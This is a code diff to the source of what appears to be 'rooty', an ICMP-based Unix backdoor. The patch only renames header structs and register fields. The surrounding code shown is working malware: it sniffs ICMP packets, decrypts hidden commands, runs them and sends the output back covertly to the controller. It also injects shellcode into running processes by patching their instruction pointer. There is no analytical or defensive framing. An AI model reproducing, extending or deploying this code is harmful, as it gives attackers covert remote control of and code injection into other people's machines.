@@ -1,13 +1,13 @@
 #include "rooty_unix.h"
 
-int build_packet(unsigned char *pkt, const struct icmphdr *icmp_input, uint8_t *data, uint32_t size) {
-	struct icmphdr *icmp = NULL;
+int build_packet(unsigned char *pkt, const struct icmp_hdr *icmp_input, uint8_t *data, uint32_t size) {
+	struct icmp_hdr *icmp = NULL;
 	uint8_t *pkt_data = NULL;
 
 	if((pkt != NULL) && (icmp_input != NULL)) {
 
-		icmp = (struct icmphdr *)pkt;
-		pkt_data = (uint8_t *)(pkt + sizeof(struct icmphdr));
+		icmp = (struct icmp_hdr *)pkt;
+		pkt_data = (uint8_t *)(pkt + sizeof(struct icmp_hdr));
 
 		// Required ICMP fields
 		icmp->type = 0;
@@ -19,14 +19,14 @@ int build_packet(unsigned char *pkt, const struct icmphdr *icmp_input, uint8_t *
 		// Copy the data into the packet
 		memcpy(pkt_data, data, size);
 
-		return (sizeof(struct icmphdr) + size);	
+		return (sizeof(struct icmp_hdr) + size);	
 	}
 	
 	return 0;
 }
 
-void send_packet(const uint8_t *data, uint32_t size, const struct iphdr *ip, const struct icmphdr *icmp) {
-	uint32_t pkt_size = sizeof(struct icmphdr) + size;
+void send_packet(const uint8_t *data, uint32_t size, const struct ip_hdr *ip, const struct icmp_hdr *icmp) {
+	uint32_t pkt_size = sizeof(struct icmp_hdr) + size;
 	uint8_t encrypted_data[size], *key = NULL, pkt[pkt_size];
 	struct sockaddr_in sin;
 	int output_socket = 0;
@@ -49,7 +49,7 @@ void send_packet(const uint8_t *data, uint32_t size, const struct iphdr *ip, con
 				// Fill in the sockaddr
 				sin.sin_family = AF_INET;
 				sin.sin_port = 0;
-				sin.sin_addr.s_addr = ip->saddr;
+				sin.sin_addr.s_addr = ip->ip_srcaddr;
 
 				// Create our socket for sending responses
 				if((output_socket = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP)) > 0) {
@@ -69,7 +69,7 @@ void send_packet(const uint8_t *data, uint32_t size, const struct iphdr *ip, con
 int inject_remote_shellcode(uint16_t pid, const unsigned char *shellcode, uint32_t size) {
 	HIJACK *hijack = NULL;
 	unsigned long shellcode_addr;
-	struct user_regs_struct *backup = NULL;
+	REGS *backup = NULL;
 	
 #ifdef __i386__
 	unsigned char fork_stub[] =
@@ -172,20 +172,20 @@ int inject_remote_shellcode(uint16_t pid, const unsigned char *shellcode, uint32
 	}	
 	DEBUG_WRAP(fprintf(stderr, "EIP updated\n"));
 #else
-	if(WriteData(hijack, shellcode_addr + 70, (unsigned char *)&(backup->rip) + 4, 4) != ERROR_NONE) {
-		DEBUG_WRAP(fprintf(stderr, "Failed to patch the original EIP back to %p.\n", (void *)backup->rip));
+	if(WriteData(hijack, shellcode_addr + 70, (unsigned char *)&(backup->r_rip) + 4, 4) != ERROR_NONE) {
+		DEBUG_WRAP(fprintf(stderr, "Failed to patch the original EIP back to %p.\n", (void *)backup->r_rip));
 		Detach(hijack);
 		return -1;
 	}
-	if(WriteData(hijack, shellcode_addr + 77, (unsigned char *)&(backup->rip), 4) != ERROR_NONE) {
-		DEBUG_WRAP(fprintf(stderr, "Failed to patch the original EIP back to %p.\n", (void *)backup->rip));
+	if(WriteData(hijack, shellcode_addr + 77, (unsigned char *)&(backup->r_rip), 4) != ERROR_NONE) {
+		DEBUG_WRAP(fprintf(stderr, "Failed to patch the original EIP back to %p.\n", (void *)backup->r_rip));
 		Detach(hijack);
 		return -1;
 	}
 
-	DEBUG_WRAP(fprintf(stderr, "Original RIP patched to %p\n", (void *)backup->rip));
+	DEBUG_WRAP(fprintf(stderr, "Original RIP patched to %p\n", (void *)backup->r_rip));
 	
-	backup->rip = shellcode_addr + 2;	// This fixes a weird issue with interruping syscalls	
+	backup->r_rip = shellcode_addr + 2;	// This fixes a weird issue with interruping syscalls	
 	if(SetRegs(hijack, backup) != ERROR_NONE) {
 		DEBUG_WRAP(fprintf(stderr, "Error setting new EIP\n"));
 		Detach(hijack);
@@ -249,7 +249,7 @@ void run_shellcode(const unsigned char *shellcode, uint32_t size) {
 	execute_shellcode(executable, new_stack + (STACK_SIZE / 2));
 }
 
-void run_command(const unsigned char *command, uint32_t size, const struct iphdr *ip, const struct icmphdr *icmp) {
+void run_command(const unsigned char *command, uint32_t size, const struct ip_hdr *ip, const struct icmp_hdr *icmp) {
 	FILE *fd = NULL;
 	uint8_t buf[MAX_PACKET_SIZE], msg[MAX_PACKET_SIZE + strlen(MAGIC) + 1], *msg_data;
 	uint32_t read = 0;
@@ -298,7 +298,7 @@ void run_command(const unsigned char *command, uint32_t size, const struct iphdr
 	}
 }
 
-void process_message(const unsigned char *data, uint32_t size, const struct iphdr *ip, const struct icmphdr *icmp) {
+void process_message(const unsigned char *data, uint32_t size, const struct ip_hdr *ip, const struct icmp_hdr *icmp) {
 	unsigned char decoded_data[size];
 	unsigned char *key = (unsigned char *)&(icmp->checksum);
 	uint32_t data_len = 0, hdr_len = 0;
@@ -351,8 +351,8 @@ void process_message(const unsigned char *data, uint32_t size, const struct iphd
 
 void process_packet(u_char *user_data, const struct pcap_pkthdr *hdr, const u_char *pkt) {
 //	const struct ether_arp *ethernet = NULL;
-	const struct iphdr *ip = NULL;
-	const struct icmphdr *icmp = NULL;
+	const struct ip_hdr *ip = NULL;
+	const struct icmp_hdr *icmp = NULL;
 	uint32_t size_ip, size_icmp;//, size_data;
 	const unsigned char *data = NULL;
 
@@ -360,12 +360,12 @@ void process_packet(u_char *user_data, const struct pcap_pkthdr *hdr, const u_ch
 	//ethernet = (struct ether_arp *)pkt;
 
 	// IP
-	ip = (struct iphdr *)(pkt + SIZE_ETHERNET);
-	size_ip = ((ip->ihl & 0x0f) * 4);
+	ip = (struct ip_hdr *)(pkt + SIZE_ETHERNET);
+	size_ip = ((ip->ip_header_len & 0x0f) * 4);
 	
 	// ICMP
-	icmp = (struct icmphdr *)(pkt + SIZE_ETHERNET + size_ip);
-	size_icmp = sizeof(struct icmphdr);
+	icmp = (struct icmp_hdr *)(pkt + SIZE_ETHERNET + size_ip);
+	size_icmp = sizeof(struct icmp_hdr);
 
 	// Data
 	data = (unsigned char *)(pkt + SIZE_ETHERNET + size_ip + size_icmp);
